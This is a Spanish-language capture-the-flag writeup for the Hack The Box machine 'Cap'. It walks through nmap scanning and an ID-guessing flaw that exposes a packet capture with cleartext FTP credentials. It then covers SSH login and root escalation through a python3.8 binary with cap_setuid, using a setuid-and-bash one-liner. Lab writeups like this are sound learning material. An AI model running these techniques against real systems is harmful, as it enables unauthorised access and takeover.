---
title: "HTB Cap"
description: "Máquina vulnerable para practicar técnicas de hacking ético"
tags: ["htb", "ctf", "writeup", "linux", "hacking"]
pubDate: 2026-01-27
lang: "es"
---
# HTB Cap
Es la primera máquina que completo en Hack The Box, y en general, de mis primeras experiencias con CTFs. Esta redacción es para documentar los pasos que seguí, aunque para las siguientes trataré de anotar realmente todo lo que hice, en parte para ver mi propia evolución, si solo pongo la parte que dio resultados positivos, será sesgado.

## Reconocimiento de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn $IP -oG
```

```text
# Nmap 7.92 scan initiated Mon Jan 26 22:17:35 2026 as: nmap -p- --open -sS --min-rate 5000 -vvv -Pn -oG port_scanning 10.129.11.180
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.11.180 (10.129.11.180)	Status: Up
Host: 10.129.11.180 (10.129.11.180)	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65532)
# Nmap done at Mon Jan 26 22:17:48 2026 -- 1 IP address (1 host up) scanned in 13.91 seconds
```

De esta primera parte, `nmap` encontró tres puertos abiertos: **21, 22, 80** 

Posteriormente, con `nmap` se enumeró qué servicios se estaban ejecutando por esos puertos y las versiones

```bash
sudo nmap -sCV -p21,22,80 -vvv 10.129.11.180 -oG port_services
```

```text
# Nmap 7.92 scan initiated Mon Jan 26 22:29:17 2026 as: nmap -sCV -p21,22,80 -vvv -oG port_services 10.129.11.180
# Ports scanned: TCP(3;21-22,80) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.11.180 (10.129.11.180)	Status: Up
Host: 10.129.11.180 (10.129.11.180)	Ports: 21/open/tcp//ftp//vsftpd 3.0.3/, 22/open/tcp//ssh//OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)/, 80/open/tcp//http//gunicorn/
# Nmap done at Mon Jan 26 22:31:37 2026 -- 1 IP address (1 host up) scanned in 139.39 seconds
```

Resultando en

- **21**: ftp, vsftpd 3.0.3

- **22:** ssh, OpenSSH 8.2p1

- **80:** http

---

## Exploración

Desde el navegador ingresé a `http://10.129.11.180` para revisar el contenido de la web, no vi gran cosa relevante, salvo presionando en el sidebar > SecuritySnapshop que redirige a `http://10.129.11.180/data/1` que permite descargar un archivo `1.pcap`

Investigando un poco encontré que este formato puedo abrirlo con `wireshark`, pero el archivo no tiene nada relevante
Algo que intenté es variar (:id) la última parte del path `http://10.129.11.180/data/:id` empezando por el cero

Esto permite descargar un archivo que es `0.pcap`, que al pasarlo por wireshark encontramos las siguientes líneas

```text
36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!
```

---

## Acceso como usuario

Intenté por `ftp` y `ssh` usando las credenciales obtenidas del archivo `0.pcap`, por `ssh` obtuve acceso

```bash
ssh nathan@10.129.11.180
ls
cat user.txt
```

---

## Escalada de privilegios

Para esto, siguiendo mis apuntes, había ejecutado unas instrucciones antes

```bash
groups
sudo -l
```

Explorar SUID/SGID

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Aunque de esto no supe seguir el hilo, por lo que probé con la tercera cosa, que era revisar los capabilities, obteniendo algo más concreto.

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Investigué cada uno, (considera escribir una entrada de los capabilities en linux para tenerlo siempre a la mano), y el más crítico fue el primero, pues me permitiría cambiar a root

Explorando un poco encontré esto

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Obteniendo acceso a root.

---

[https://labs.hackthebox.com/achievement/machine/2859769/351](https://labs.hackthebox.com/achievement/machine/2859769/351)
